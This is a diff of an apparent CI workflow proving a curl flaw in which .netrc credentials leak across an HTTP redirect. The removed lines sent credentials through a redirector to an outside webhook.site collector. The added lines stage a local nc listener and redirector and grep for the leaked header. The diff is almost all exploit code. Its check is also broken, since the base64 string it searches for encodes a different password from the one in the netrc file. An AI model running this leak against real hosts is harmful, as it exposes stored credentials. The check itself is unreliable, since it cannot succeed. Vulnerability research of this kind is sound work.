@@ -9,19 +9,41 @@ jobs:
     steps:
       - name: Create malicious .netrc file
         run: |
-          # This is the FIX: The machine name must match the first host we connect to.
           cat <<EOF > .netrc_poc
-          machine httpbin.org
-          login ci_user
+          machine localhost
+          login admin
           password SuperSecretCiKey123
 
           macdef exploit_trigger
 
           default
-          login not_ci_user
+          login not_admin
           EOF
 
-      - name: Trigger the vulnerability using a redirector service
+      - name: Run servers and trigger the exploit
         run: |
-          # The command remains the same.
-          curl -v -L --netrc-file .netrc_poc "https://httpbin.org/redirect-to?url=https://webhook.site/163be8c4-85f1-42eb-8cbe-ec643d9888db"
+          # 1. Start Attacker server in the background, save output to a log file
+          nc -l -p 9000 > attacker.log &
+          
+          # 2. Start Victim server (redirector) in the background
+          echo -e "HTTP/1.1 301 Moved Permanently\nLocation: http://localhost:9000" | nc -l -p 8000 -q 1 &
+          
+          # Give servers a moment to start
+          sleep 2
+          
+          # 3. Trigger the exploit
+          echo "--- Triggering curl against localhost:8000 ---"
+          curl -v -L --netrc-file .netrc_poc http://localhost:8000
+          
+          # 4. Show the results
+          echo "--- Content of attacker.log ---"
+          cat attacker.log
+          
+          # 5. Check if the leak happened
+          if grep -q "Authorization: Basic YWRtaW46U3VwZXJTZWNyZXRQYXNzd29yZDEyMw==" attacker.log; then
+            echo "SUCCESS: Credentials successfully leaked!"
+            exit 0
+          else
+            echo "FAILURE: Credentials not found in log."
+            exit 1
+          fi
